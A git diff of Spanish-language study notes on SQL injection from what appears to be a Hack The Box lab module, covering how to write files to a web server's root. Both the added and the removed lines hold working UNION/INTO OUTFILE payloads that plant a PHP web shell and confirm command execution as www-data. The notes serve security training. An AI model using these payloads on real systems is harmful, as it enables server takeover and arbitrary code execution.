@@ -319,57 +319,10 @@ SELECT FROM_BASE64("base64_data") INTO OUTFILE '/tmp/test.txt'; -- - con texto l
 > [!TIP]
 > Para escribir una `web shell`, debemos conocer el directorio web base del servidor web (`web root`). Para ello podemos tratar de leer el archivo de configuración del servidor (Ej `/etc/apache2/apache2.conf`), buscar en línea posibles ubicaciones de configuración, usar fuzzing o provocar errores
 
+El _payload_ de la inyección `UNION` sería el siguiente (importante, hay que quitar los números):
+```SQL
+UNION SELECT "",'file written successfully!',"" into outfile '/var/www/html/proof.txt'-- -
 
----
+UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "" into outfile '/var/www/html/shell.php'-- -
+```
 
-## Escritura de archivos a través de inyección SQL (_SQL Injection_)
-
-Intentemos escribir un archivo de texto en el _webroot_ y verifiquemos si tenemos permisos de escritura. La siguiente consulta debería escribir `file written successfully!` en el archivo `/var/www/html/proof.txt`, al que luego podremos acceder en la aplicación web:
-
-        sql
-`select 'file written successfully!' into outfile '/var/www/html/proof.txt'`
-
-**Nota:** Para escribir una *web shell*, debemos conocer el directorio web base del servidor web (es decir, el *web root*). Una forma de encontrarlo es usar `load_file` para leer la configuración del servidor, como la configuración de Apache que se encuentra en `/etc/apache2/apache2.conf`, la configuración de Nginx en `/etc/nginx/nginx.conf`, o la configuración de IIS en `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, o podemos buscar en línea otras posibles ubicaciones de configuración. Además, podemos ejecutar un escaneo de *fuzzing* (*fuzzing scan*) e intentar escribir archivos en diferentes *web roots* posibles, usando [esta lista de palabras para Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) o [esta lista de palabras para Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finalmente, si nada de lo anterior funciona, podemos usar los errores del servidor que se nos muestran e intentar encontrar el directorio web de esa manera.
-
-El _payload_ de la inyección `UNION` sería el siguiente:
-
-        sql
-`cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`
-
-http://SERVER_IP:PORT/search.php?port_code=cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
-
-![Interfaz de búsqueda con un cuadro de texto y un botón con la etiqueta 'Search'. Debajo hay una tabla vacía con las columnas: Port Code, Port City y Port Volume](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/write_proof.png)
-
-No vemos ningún error en la página, lo que indica que la consulta se realizó con éxito. Al buscar el archivo `proof.txt` en el _webroot_, vemos que efectivamente existe:
-
-http://SERVER_IP:PORT/proof.txt
-
-![Texto que muestra: '1 file written successfully! 3 4'](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/write_proof_text.png)
-
-Nota: Vemos la cadena de texto que volcamos junto con '1', '3' antes, y '4' después. Esto se debe a que todo el resultado de la consulta 'UNION' se escribió en el archivo. Para que la salida sea más limpia, podemos usar "" en lugar de números.
-
----
-
-## Escribir una _web shell_
-
-Una vez confirmados los permisos de escritura, podemos proceder a escribir una _web shell_ en PHP en la carpeta _webroot_. Podemos escribir la siguiente _webshell_ en PHP para poder ejecutar comandos directamente en el servidor _back-end_:
-
-        php
-`<?php system($_REQUEST[0]); ?>`
-
-Podemos reutilizar nuestro _payload_ de inyección `UNION` anterior, y cambiar la cadena de texto por la de arriba, y el nombre del archivo a `shell.php`:
-
-        sql
-`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`
-
-http://SERVER_IP:PORT/search.php?port_code=cn' union select “ “,'<?php system($_REQUEST[0]); ?>', “ “, “ “ into outfile '/var/www/html/shell.php'-- -
-
-![Interfaz de búsqueda con un cuadro de texto y un botón con la etiqueta 'Search'. Debajo hay una tabla vacía con las columnas: Port Code, Port City y Port Volume](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/write_shell.png)
-
-Una vez más, no vemos ningún error, lo que significa que la escritura del archivo probablemente funcionó. Esto se puede verificar navegando al archivo `/shell.php` y ejecutando comandos a través del parámetro `0`, con `?0=id` en nuestra URL:
-
-http://SERVER_IP:PORT/shell.php?0=id
-
-![Texto que muestra: uid=33(www-data) gid=33(www-data) groups=33(www-data)](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/write_shell_exec_1.png)
-
-La salida del comando `id` confirma que tenemos ejecución de código y que estamos operando como el usuario `www-data`.
